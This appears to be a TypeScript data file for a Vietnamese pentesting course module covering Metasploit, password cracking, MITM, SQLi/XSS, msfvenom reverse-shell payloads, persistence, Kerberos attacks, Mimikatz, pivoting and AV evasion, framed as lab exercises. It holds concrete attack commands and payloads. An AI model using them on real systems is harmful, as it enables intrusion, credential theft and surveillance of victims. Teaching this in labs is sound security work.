import { Module } from '../../types';

export const MODULE_4: Module = {
  id: 'network-attacks',
  title: 'Giai đoạn 4: Tấn công mạng (Buổi 61-80)',
  sessions: [
    {
      id: 'day-61',
      day: 61,
      category: 'Theory',
      title: 'Quy trình Pentest (Kiểm thử xâm nhập)',
      description: 'Các bước tấn công một hệ thống mạng.',
      content: `Lý thuyết:
Pentest không phải là chạy tool ngẫu nhiên. Nó tuân theo các bước:
1. Reconnaissance (Thu thập thông tin): Tìm IP, tên miền, email.
2. Scanning & Enumeration: Quét cổng, xác định dịch vụ, tìm lỗi.
3. Gaining Access (Khai thác): Sử dụng exploit để chiếm quyền.
4. Maintaining Access: Cài backdoor để duy trì kết nối.
5. Covering Tracks: Xóa log để không bị phát hiện.

Phân biệt:
- Black Box: Không biết gì về mục tiêu.
- White Box: Biết toàn bộ sơ đồ mạng, code.
- Grey Box: Biết một phần thông tin.`,
      exercises: [
        {
          title: 'Lập kế hoạch tấn công Lab',
          description: 'Xác định mục tiêu và phương pháp.',
          steps: [
            'Xác định IP của máy Windows mục tiêu.',
            'Liệt kê các dịch vụ bạn nghi ngờ có thể khai thác (ví dụ: SMB, RDP, HTTP).',
            'Chuẩn bị các công cụ tương ứng trên Kali.'
          ]
        }
      ]
    },
    {
      id: 'day-62',
      day: 62,
      category: 'Practice',
      title: 'Nmap nâng cao & Scripting Engine (NSE)',
      description: 'Sử dụng script để tự động tìm lỗ hổng.',
      content: `Lý thuyết:
NSE (Nmap Scripting Engine) cho phép Nmap làm nhiều hơn là chỉ quét cổng. Nó có thể:
- Phát hiện lỗ hổng (Vulnerability detection).
- Brute-force mật khẩu.
- Thu thập thông tin chi tiết về dịch vụ.
Các script nằm trong thư mục /usr/share/nmap/scripts/.`,
      commands: [
        { name: 'Vuln Scan', description: 'Quét các lỗ hổng phổ biến', usage: 'nmap --script vuln 192.168.1.10' },
        { name: 'SMB Enum', description: 'Liệt kê thông tin SMB', usage: 'nmap --script smb-enum-shares 192.168.1.10' }
      ],
      exercises: [
        {
          title: 'Tìm lỗi SMB',
          description: 'Sử dụng script smb-vuln-ms17-010.',
          steps: [
            'Chạy Nmap với script kiểm tra lỗi EternalBlue (MS17-010) trên máy Windows.',
            'Nếu kết quả trả về "VULNERABLE", bạn đã tìm thấy một lỗ hổng cực kỳ nghiêm trọng.',
            'Giải thích tại sao lỗi này lại nguy hiểm (nó cho phép thực thi mã từ xa - RCE).'
          ]
        }
      ]
    },
    {
      id: 'day-63',
      day: 63,
      category: 'Practice',
      title: 'Khai thác với Metasploit Framework',
      description: 'Sử dụng "vũ khí" hạng nặng của hacker.',
      content: `Lý thuyết:
Metasploit là framework tấn công phổ biến nhất.
Khái niệm:
- Exploit: Đoạn mã tận dụng lỗ hổng.
- Payload: Đoạn mã thực thi sau khi exploit thành công (ví dụ: mở shell).
- Meterpreter: Một payload nâng cao cho phép điều khiển máy nạn nhân cực kỳ mạnh mẽ.`,
      commands: [
        { name: 'Start MSF', description: 'Mở console Metasploit', usage: 'msfconsole' },
        { name: 'Search Exploit', description: 'Tìm kiếm exploit', usage: 'search eternalblue' }
      ],
      exercises: [
        {
          title: 'Chiếm quyền điều khiển (Reverse Shell)',
          description: 'Khai thác lỗ hổng MS17-010.',
          steps: [
            'Trong msfconsole, chọn exploit/windows/smb/ms17_010_eternalblue.',
            'Set RHOSTS (IP máy nạn nhân) và LHOST (IP máy Kali).',
            'Gõ "exploit" và đợi kết nối Meterpreter.',
            'Sử dụng lệnh "sysinfo" và "getuid" để kiểm tra quyền hạn.'
          ]
        }
      ]
    },
    {
      id: 'day-64',
      day: 64,
      category: 'Theory',
      title: 'Tấn công mật khẩu: Brute Force & Dictionary',
      description: 'Cách hacker bẻ khóa tài khoản.',
      content: `Lý thuyết:
1. Brute Force: Thử mọi tổ hợp ký tự (Rất chậm).
2. Dictionary Attack: Thử danh sách các mật khẩu phổ biến (Nhanh hơn).
3. Rainbow Tables: Sử dụng bảng mã băm tính toán trước (Cực nhanh).
Các công cụ phổ biến: Hydra (tấn công online), John the Ripper / Hashcat (tấn công offline).`,
      commands: [
        { name: 'Hydra SSH', description: 'Brute force SSH', usage: 'hydra -l root -P passlist.txt ssh://192.168.1.10' }
      ],
      exercises: [
        {
          title: 'Bẻ khóa file ZIP',
          description: 'Sử dụng fcrackzip.',
          steps: [
            'Tạo một file ZIP có đặt mật khẩu.',
            'Sử dụng fcrackzip với một file từ điển (wordlist) để tìm mật khẩu.',
            'Thử tạo mật khẩu phức tạp hơn và xem thời gian bẻ khóa thay đổi như thế nào.'
          ]
        }
      ]
    },
    {
      id: 'day-65',
      day: 65,
      category: 'Practice',
      title: 'Nghe lén mạng (Sniffing) & MITM',
      description: 'Tấn công Man-in-the-Middle với ARP Spoofing.',
      content: `Lý thuyết:
ARP Spoofing lừa máy nạn nhân và Router rằng máy Kali là đối tác của họ. Toàn bộ dữ liệu sẽ chạy qua máy Kali trước khi đi tiếp.
Công cụ: Ettercap hoặc Bettercap.
Dấu hiệu nhận biết: Bảng ARP của máy nạn nhân bị thay đổi (địa chỉ MAC của Gateway bị thay bằng MAC của hacker).`,
      exercises: [
        {
          title: 'Đánh cắp thông tin đăng nhập',
          description: 'Sử dụng Bettercap.',
          steps: [
            'Chạy bettercap trên Kali.',
            'Kích hoạt arp.spoof và net.sniff.',
            'Trên máy Windows, đăng nhập vào một trang web HTTP.',
            'Quan sát Bettercap để thấy Username và Password hiện ra dưới dạng văn bản thuần.'
          ]
        }
      ]
    },
    {
      id: 'day-66',
      day: 66,
      category: 'Theory',
      title: 'Tấn công Web: SQL Injection (SQLi)',
      description: 'Khai thác lỗ hổng cơ sở dữ liệu.',
      content: `Lý thuyết:
SQLi xảy ra khi ứng dụng web đưa dữ liệu người dùng trực tiếp vào câu lệnh SQL mà không kiểm tra.
Ví dụ: SELECT * FROM users WHERE username = 'admin' OR '1'='1' --'
Lỗ hổng này cho phép hacker:
- Đăng nhập không cần mật khẩu.
- Trích xuất toàn bộ database.
- Xóa hoặc sửa đổi dữ liệu.`,
      exercises: [
        {
          title: 'Thực hành SQLi thủ công',
          description: 'Sử dụng môi trường DVWA (Damn Vulnerable Web App).',
          steps: [
            'Cài đặt DVWA trên một máy ảo Linux khác.',
            'Vào phần SQL Injection, thử nhập dấu nháy đơn (\') để xem có lỗi SQL hiện ra không.',
            'Sử dụng lệnh UNION SELECT để tìm số lượng cột và tên database.'
          ]
        }
      ]
    },
    {
      id: 'day-67',
      day: 67,
      category: 'Practice',
      title: 'Tấn công Web: Cross-Site Scripting (XSS)',
      description: 'Tiêm mã JavaScript độc hại vào trình duyệt nạn nhân.',
      content: `Lý thuyết:
XSS cho phép hacker thực thi script trong trình duyệt của người dùng khác.
Các loại XSS:
1. Reflected: Script nằm trong URL.
2. Stored: Script được lưu vào database (ví dụ: trong phần comment).
3. DOM-based: Khai thác logic xử lý script của trình duyệt.
Mục tiêu: Đánh cắp Cookie phiên làm việc (Session Hijacking).`,
      exercises: [
        {
          title: 'Đánh cắp Cookie',
          description: 'Thực hành Stored XSS.',
          steps: [
            'Trong DVWA, vào phần XSS (Stored).',
            'Nhập script: <script>alert(document.cookie)</script> vào phần comment.',
            'Mỗi khi ai đó xem trang này, cookie của họ sẽ hiện lên màn hình.'
          ]
        }
      ]
    },
    {
      id: 'day-68',
      day: 68,
      category: 'Lab',
      title: 'Tạo mã độc với Msfvenom',
      description: 'Tạo file thực thi độc hại tùy chỉnh.',
      content: `Lý thuyết:
Msfvenom là công cụ kết hợp giữa Msfpayload và Msfencode. Nó có thể tạo ra mã độc cho Windows, Linux, Android, macOS...
Kỹ thuật Encoder: Giúp mã độc tránh bị Antivirus phát hiện (ví dụ: shikata_ga_nai).`,
      commands: [
        { name: 'Create EXE', description: 'Tạo mã độc Windows', usage: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_KALI LPORT=4444 -f exe > virus.exe' }
      ],
      exercises: [
        {
          title: 'Tấn công máy nạn nhân',
          description: 'Gửi và thực thi mã độc.',
          steps: [
            'Tạo file virus.exe bằng msfvenom.',
            'Mở Multi/Handler trên Metasploit để đợi kết nối.',
            'Copy file virus.exe sang máy Windows và chạy nó.',
            'Sử dụng lệnh "screenshot" và "webcam_stream" trong Meterpreter để theo dõi nạn nhân.'
          ]
        }
      ]
    },
    {
      id: 'day-69',
      day: 69,
      category: 'Theory',
      title: 'Leo thang đặc quyền (Privilege Escalation)',
      description: 'Từ User thường lên Admin/Root.',
      content: `Lý thuyết:
Sau khi chiếm được shell, thường bạn chỉ có quyền user thấp. Để kiểm soát hoàn toàn máy tính, bạn cần quyền cao nhất.
Kỹ thuật trên Windows:
- Khai thác lỗ hổng Kernel.
- Tìm mật khẩu lưu trong file cấu hình hoặc Registry.
- Tấn công các dịch vụ chạy quyền System nhưng bị cấu hình sai (Unquoted Service Path).`,
      exercises: [
        {
          title: 'Sử dụng WinPEAS',
          description: 'Tự động tìm đường leo thang đặc quyền.',
          steps: [
            'Tải WinPEAS lên máy Windows nạn nhân.',
            'Chạy và đọc kết quả (các phần màu đỏ/vàng là những lỗ hổng tiềm năng).',
            'Thử thực hiện một kỹ thuật leo thang đơn giản dựa trên gợi ý.'
          ]
        }
      ]
    },
    {
      id: 'day-70',
      day: 70,
      category: 'Practice',
      title: 'Duy trì kết nối (Persistence)',
      description: 'Đảm bảo bạn không bị mất shell khi máy khởi động lại.',
      content: `Lý thuyết:
Hacker cần quay lại máy nạn nhân bất cứ lúc nào.
Các cách phổ biến:
- Thêm mã độc vào thư mục Startup.
- Tạo một Task Scheduler chạy định kỳ.
- Sửa đổi Registry (khóa Run/RunOnce).
- Cài đặt một dịch vụ Windows mới.`,
      exercises: [
        {
          title: 'Cài đặt Backdoor Registry',
          description: 'Sử dụng Meterpreter persistence.',
          steps: [
            'Trong session Meterpreter, sử dụng module "post/windows/manage/persistence_exe".',
            'Cấu hình để nó tự chạy mỗi khi Windows khởi động.',
            'Khởi động lại máy Windows và kiểm tra xem Kali có tự động nhận lại shell không.'
          ]
        }
      ]
    },
    {
      id: 'day-71',
      day: 71,
      category: 'Theory',
      title: 'Active Directory (AD) Cơ bản',
      description: 'Hệ thống quản lý mạng doanh nghiệp.',
      content: `Lý thuyết:
Hầu hết các công ty lớn đều dùng Active Directory của Microsoft để quản lý hàng ngàn máy tính và người dùng.
Các khái niệm cốt lõi:
- Domain Controller (DC): Máy chủ "trùm", chứa toàn bộ mật khẩu và quyền hạn.
- Domain Admin: Tài khoản có quyền cao nhất trong mạng.
- GPO (Group Policy Object): Các chính sách áp dụng cho toàn mạng (ví dụ: cấm dùng USB).
- Kerberos: Giao thức xác thực chính của AD (sử dụng Ticket thay vì gửi mật khẩu).`,
      exercises: [
        {
          title: 'Xây dựng Lab AD thu nhỏ',
          description: 'Cài đặt Windows Server.',
          steps: [
            'Cài đặt Windows Server 2019/2022 trên máy ảo.',
            'Nâng cấp nó lên thành Domain Controller (dcpromo).',
            'Tạo một vài user và group ảo (ví dụ: IT_Admin, HR_Users).',
            'Join máy Windows 10 cũ vào Domain vừa tạo.'
          ]
        }
      ]
    },
    {
      id: 'day-72',
      day: 72,
      category: 'Practice',
      title: 'AD Enumeration với BloodHound',
      description: 'Vẽ bản đồ quyền lực trong mạng.',
      content: `Lý thuyết:
Trong mạng AD, quyền hạn thường bị cấp sai (Misconfiguration). Một user thường có thể có đường dẫn (Attack Path) để chiếm quyền Domain Admin.
BloodHound sử dụng lý thuyết đồ thị (Graph Theory) để vẽ ra các con đường này. Nó cần một công cụ thu thập dữ liệu gọi là SharpHound.`,
      commands: [
        { name: 'Run SharpHound', description: 'Thu thập dữ liệu AD', usage: 'Invoke-BloodHound -CollectionMethod All' }
      ],
      exercises: [
        {
          title: 'Tìm đường lên đỉnh',
          description: 'Phân tích dữ liệu BloodHound.',
          steps: [
            'Chạy SharpHound trên máy Windows 10 (đã join domain) bằng quyền user thường.',
            'Copy file .zip kết quả sang máy Kali.',
            'Import vào BloodHound (cần cài đặt Neo4j database trước).',
            'Sử dụng các query có sẵn như "Find Shortest Path to Domain Admins".'
          ]
        }
      ]
    },
    {
      id: 'day-73',
      day: 73,
      category: 'Theory',
      title: 'Tấn công Kerberos: AS-REP Roasting',
      description: 'Khai thác lỗi cấu hình xác thực.',
      content: `Lý thuyết:
Trong Kerberos, bước đầu tiên là user yêu cầu một TGT (Ticket Granting Ticket) từ DC (gọi là AS-REQ). DC trả về AS-REP có chứa một phần dữ liệu được mã hóa bằng mật khẩu của user.
Bình thường, user phải gửi kèm một timestamp được mã hóa (Pre-Authentication) để chứng minh mình biết mật khẩu.
Tuy nhiên, nếu tài khoản bị cấu hình "Do not require Kerberos preauthentication", hacker có thể yêu cầu AS-REP của bất kỳ ai và mang về bẻ khóa offline.`,
      commands: [
        { name: 'GetNPUsers', description: 'Tìm user bị lỗi Pre-Auth (Impacket)', usage: 'GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile hashes.txt' }
      ],
      exercises: [
        {
          title: 'Roasting User',
          description: 'Thực hành AS-REP Roasting.',
          steps: [
            'Trên DC, tạo một user và tick vào ô "Do not require Kerberos preauthentication".',
            'Từ Kali, sử dụng công cụ GetNPUsers.py (trong bộ Impacket) để lấy mã băm của user đó.',
            'Sử dụng Hashcat (mode 18200) để bẻ khóa mã băm vừa lấy được.'
          ]
        }
      ]
    },
    {
      id: 'day-74',
      day: 74,
      category: 'Practice',
      title: 'Tấn công Kerberos: Kerberoasting',
      description: 'Nhắm vào các tài khoản Service.',
      content: `Lý thuyết:
Các dịch vụ trong mạng (như SQL Server, IIS) chạy dưới quyền của một Service Account (có SPN - Service Principal Name).
Bất kỳ user nào trong domain cũng có thể yêu cầu một TGS (Ticket Granting Service) để truy cập dịch vụ này.
TGS này được mã hóa bằng mật khẩu của Service Account. Hacker có thể yêu cầu TGS và mang về bẻ khóa offline.
Vì Service Account thường có quyền cao và mật khẩu ít bị thay đổi, đây là mục tiêu rất hấp dẫn.`,
      commands: [
        { name: 'GetUserSPNs', description: 'Lấy TGS của Service Accounts', usage: 'GetUserSPNs.py domain.local/user:password -request' }
      ],
      exercises: [
        {
          title: 'Săn Service Account',
          description: 'Thực hành Kerberoasting.',
          steps: [
            'Trên DC, tạo một user và gán cho nó một SPN giả (setspn -a HTTP/webserver svc_web).',
            'Từ Kali, sử dụng GetUserSPNs.py để lấy TGS của svc_web.',
            'Sử dụng Hashcat (mode 13100) để bẻ khóa.'
          ]
        }
      ]
    },
    {
      id: 'day-75',
      category: 'Theory',
      day: 75,
      title: 'Pass-the-Hash (PtH) & Pass-the-Ticket (PtT)',
      description: 'Đăng nhập không cần biết mật khẩu thật.',
      content: `Lý thuyết:
Windows không lưu mật khẩu dạng rõ (plaintext) trong bộ nhớ, mà lưu dưới dạng mã băm NTLM.
Pass-the-Hash: Nếu hacker lấy được mã băm NTLM (ví dụ bằng Mimikatz), họ có thể dùng chính mã băm đó để xác thực với các máy khác mà không cần giải mã ra mật khẩu gốc.
Pass-the-Ticket: Tương tự, nếu lấy được Kerberos Ticket (TGT/TGS) hợp lệ từ bộ nhớ, hacker có thể "bơm" (inject) nó vào phiên làm việc hiện tại để giả mạo user đó.`,
      commands: [
        { name: 'PtH với CrackMapExec', description: 'Đăng nhập bằng mã băm', usage: 'crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_Hash>' }
      ],
      exercises: [
        {
          title: 'Lan truyền trong mạng (Lateral Movement)',
          description: 'Sử dụng mã băm để di chuyển.',
          steps: [
            'Giả sử bạn đã có mã băm NTLM của Local Admin (lấy từ máy Windows 10).',
            'Sử dụng CrackMapExec (CME) hoặc psexec.py để thử đăng nhập vào các máy khác trong mạng bằng mã băm đó.',
            'Giải thích tại sao việc dùng chung một mật khẩu Local Admin cho mọi máy lại cực kỳ nguy hiểm.'
          ]
        }
      ]
    },
    {
      id: 'day-76',
      day: 76,
      category: 'Practice',
      title: 'Đánh cắp thông tin với Mimikatz',
      description: 'Công cụ ác mộng của Windows Admin.',
      content: `Lý thuyết:
Mimikatz là công cụ nổi tiếng nhất để trích xuất mật khẩu dạng rõ, mã băm, mã PIN và Kerberos tickets từ bộ nhớ của Windows (tiến trình LSASS).
Lưu ý: Mimikatz bị mọi trình diệt virus nhận diện ngay lập tức. Trong thực tế, hacker thường phải làm rối (obfuscate) nó hoặc chỉ dump tiến trình LSASS mang về máy mình phân tích (offline).`,
      commands: [
        { name: 'Dump LSASS', description: 'Tạo file dump của LSASS (chạy bằng quyền Admin)', usage: 'procdump.exe -accepteula -ma lsass.exe lsass.dmp' }
      ],
      exercises: [
        {
          title: 'Trích xuất mật khẩu',
          description: 'Sử dụng Mimikatz cơ bản.',
          steps: [
            'Tắt Windows Defender trên máy Windows 10.',
            'Tải và chạy Mimikatz bằng quyền Administrator.',
            'Chạy lệnh: privilege::debug (để lấy quyền gỡ lỗi).',
            'Chạy lệnh: sekurlsa::logonpasswords (để xem mật khẩu của các user đã đăng nhập).',
            'Quan sát kết quả NTLM hash và đôi khi là cả mật khẩu rõ (nếu WDigest được bật).'
          ]
        }
      ]
    },
    {
      id: 'day-77',
      day: 77,
      category: 'Theory',
      title: 'Tấn công NTLM Relay',
      description: 'Chặn bắt và chuyển tiếp xác thực.',
      content: `Lý thuyết:
Khi một máy Windows cố gắng kết nối tới một máy khác (ví dụ qua SMB), nó sẽ gửi thông tin xác thực NTLM.
Hacker có thể đứng ở giữa (MITM), chặn bắt yêu cầu xác thực này và CHUYỂN TIẾP (Relay) nó tới một máy chủ thứ 3.
Nếu user bị chặn bắt có quyền Admin trên máy thứ 3, hacker sẽ chiếm được máy đó.
Công cụ: Responder (để đầu độc mạng và bắt xác thực) + ntlmrelayx (để chuyển tiếp).`,
      exercises: [
        {
          title: 'Hiểu về SMB Signing',
          description: 'Cách phòng chống NTLM Relay.',
          steps: [
            'Tìm hiểu khái niệm SMB Signing (Ký điện tử cho gói tin SMB).',
            'Tại sao NTLM Relay sẽ thất bại nếu máy đích bắt buộc (Require) SMB Signing?',
            'Sử dụng Nmap (script smb-security-mode) để kiểm tra xem máy DC có bắt buộc SMB Signing không.'
          ]
        }
      ]
    },
    {
      id: 'day-78',
      day: 78,
      category: 'Practice',
      title: 'Pivoting & Port Forwarding',
      description: 'Xuyên thủng các lớp mạng nội bộ.',
      content: `Lý thuyết:
Trong thực tế, máy chủ chứa dữ liệu quan trọng không bao giờ nối trực tiếp ra Internet.
Hacker phải xâm nhập một máy ở vòng ngoài (DMZ), sau đó dùng máy đó làm "bàn đạp" (Pivot) để tấn công sâu vào mạng nội bộ.
Kỹ thuật Port Forwarding cho phép chuyển hướng traffic từ máy Kali, đi qua máy bàn đạp, và tới mục tiêu bên trong.
Công cụ: Chisel, Proxychains, SSH Tunneling.`,
      commands: [
        { name: 'Proxychains', description: 'Chạy công cụ qua Proxy', usage: 'proxychains nmap -sT 10.0.0.5' }
      ],
      exercises: [
        {
          title: 'Thiết lập đường hầm',
          description: 'Sử dụng Chisel để tạo SOCKS Proxy.',
          steps: [
            'Chạy Chisel Server trên Kali.',
            'Chạy Chisel Client trên máy Windows (bàn đạp) để kết nối ngược về Kali.',
            'Cấu hình file /etc/proxychains4.conf trên Kali để trỏ tới cổng của Chisel.',
            'Sử dụng proxychains để quét Nmap một dải IP nội bộ mà Kali không thể thấy trực tiếp.'
          ]
        }
      ]
    },
    {
      id: 'day-79',
      day: 79,
      category: 'Theory',
      title: 'Bypass Antivirus (AV Evasion)',
      description: 'Cách mã độc qua mặt phần mềm bảo vệ.',
      content: `Lý thuyết:
Antivirus hoạt động dựa trên 2 cơ chế chính:
1. Signature-based (Chữ ký): Quét mã băm hoặc chuỗi byte quen thuộc.
2. Heuristic/Behavioral (Hành vi): Theo dõi xem chương trình có làm gì khả nghi không (ví dụ: tiêm code vào tiến trình khác).

Cách Bypass:
- Obfuscation/Crypter: Mã hóa payload để đổi chữ ký.
- In-memory execution: Chạy thẳng trên RAM, không chạm vào ổ cứng.
- AMSI Bypass: Vô hiệu hóa Antimalware Scan Interface của Windows (thường dùng cho PowerShell).`,
      exercises: [
        {
          title: 'Thử nghiệm mã hóa Payload',
          description: 'Sử dụng công cụ đơn giản để giấu mã độc.',
          steps: [
            'Tạo một payload bằng msfvenom.',
            'Sử dụng một công cụ như Veil-Evasion hoặc viết một script C# đơn giản (sử dụng XOR) để bọc payload đó lại.',
            'Tải file lên trang web AntiScan.me (KHÔNG dùng VirusTotal vì nó sẽ chia sẻ mẫu cho các hãng AV) để xem tỷ lệ bị phát hiện.'
          ]
        }
      ]
    },
    {
      id: 'day-80',
      day: 80,
      category: 'Lab',
      title: 'Tổng kết Giai đoạn 4: Network Pentest Challenge',
      description: 'Thử thách xâm nhập mạng doanh nghiệp giả lập.',
      content: `Lý thuyết:
Chúc mừng bạn đã hoàn thành Giai đoạn 4!
Hôm nay là bài kiểm tra tổng hợp. Bạn sẽ được cấp quyền truy cập vào một mạng Lab có chứa Active Directory.
Mục tiêu cuối cùng của bạn là chiếm được quyền Domain Admin và đọc file flag.txt trên màn hình của máy Domain Controller.`,
      exercises: [
        {
          title: 'The Final Hack',
          description: 'Chiến dịch Pentest toàn diện.',
          steps: [
            'Recon: Quét mạng, tìm các máy đang mở.',
            'Initial Access: Khai thác một lỗ hổng Web hoặc SMB để lấy shell trên máy đầu tiên.',
            'Privilege Escalation: Leo quyền lên Local Admin trên máy đó.',
            'Credential Access: Dùng Mimikatz lấy mã băm hoặc mật khẩu.',
            'Lateral Movement: Dùng Pass-the-Hash để nhảy sang máy khác.',
            'Domain Admin: Khai thác lỗi Kerberos hoặc tìm đường qua BloodHound để chiếm DC.'
          ]
        }
      ],
      quizzes: [
        {
          question: "Trong quy trình Pentest, bước nào liên quan đến việc thu thập thông tin công khai (OSINT) về mục tiêu trước khi thực sự chạm vào hệ thống?",
          options: [
            { id: 'A', text: 'Scanning & Enumeration', isCorrect: false },
            { id: 'B', text: 'Gaining Access', isCorrect: false },
            { id: 'C', text: 'Reconnaissance', isCorrect: true },
            { id: 'D', text: 'Covering Tracks', isCorrect: false }
          ],
          explanation: "Reconnaissance (Trinh sát) là bước đầu tiên, thu thập thông tin từ các nguồn mở (whois, DNS, mạng xã hội) để hiểu rõ mục tiêu."
        },
        {
          question: "Kỹ thuật tấn công nào lợi dụng việc cấu hình sai 'Do not require Kerberos preauthentication' trong Active Directory?",
          options: [
            { id: 'A', text: 'Kerberoasting', isCorrect: false },
            { id: 'B', text: 'AS-REP Roasting', isCorrect: true },
            { id: 'C', text: 'Pass-the-Hash', isCorrect: false },
            { id: 'D', text: 'NTLM Relay', isCorrect: false }
          ],
          explanation: "AS-REP Roasting cho phép hacker yêu cầu gói tin AS-REP (chứa dữ liệu mã hóa bằng mật khẩu user) mà không cần chứng minh danh tính trước, sau đó mang về bẻ khóa offline."
        },
        {
          question: "Công cụ nào sau đây sử dụng lý thuyết đồ thị (Graph Theory) để trực quan hóa các đường dẫn tấn công (Attack Paths) trong mạng Active Directory?",
          options: [
            { id: 'A', text: 'Mimikatz', isCorrect: false },
            { id: 'B', text: 'CrackMapExec', isCorrect: false },
            { id: 'C', text: 'Responder', isCorrect: false },
            { id: 'D', text: 'BloodHound', isCorrect: true }
          ],
          explanation: "BloodHound phân tích dữ liệu quyền hạn trong AD và vẽ ra các biểu đồ cho thấy cách một user thường có thể leo thang lên quyền Domain Admin."
        },
        {
          question: "Kỹ thuật Pass-the-Hash (PtH) cho phép hacker làm gì?",
          options: [
            { id: 'A', text: 'Giải mã mã băm NTLM thành mật khẩu rõ (plaintext) ngay lập tức', isCorrect: false },
            { id: 'B', text: 'Xác thực với các hệ thống Windows khác bằng mã băm NTLM mà không cần biết mật khẩu gốc', isCorrect: true },
            { id: 'C', text: 'Chuyển tiếp yêu cầu xác thực SMB tới một máy chủ khác', isCorrect: false },
            { id: 'D', text: 'Tạo ra một Kerberos Ticket giả mạo (Golden Ticket)', isCorrect: false }
          ],
          explanation: "Vì Windows sử dụng mã băm NTLM để xác thực trong nhiều giao thức, hacker chỉ cần có mã băm là đủ để đăng nhập, không cần tốn thời gian bẻ khóa ra mật khẩu thật."
        },
        {
          question: "Mục đích chính của kỹ thuật Pivoting trong mạng là gì?",
          options: [
            { id: 'A', text: 'Sử dụng một máy đã bị xâm nhập làm bàn đạp để tấn công các máy khác nằm sâu hơn trong mạng nội bộ', isCorrect: true },
            { id: 'B', text: 'Leo thang đặc quyền từ user thường lên quyền root', isCorrect: false },
            { id: 'C', text: 'Ẩn giấu địa chỉ IP thực của hacker khi lướt web', isCorrect: false },
            { id: 'D', text: 'Vô hiệu hóa phần mềm Antivirus trên máy nạn nhân', isCorrect: false }
          ],
          explanation: "Pivoting giúp hacker vượt qua các rào cản mạng (như Firewall) bằng cách định tuyến traffic tấn công xuyên qua một máy tính đã bị kiểm soát nằm trong vùng mạng đó."
        }
      ]
    }
  ]
};
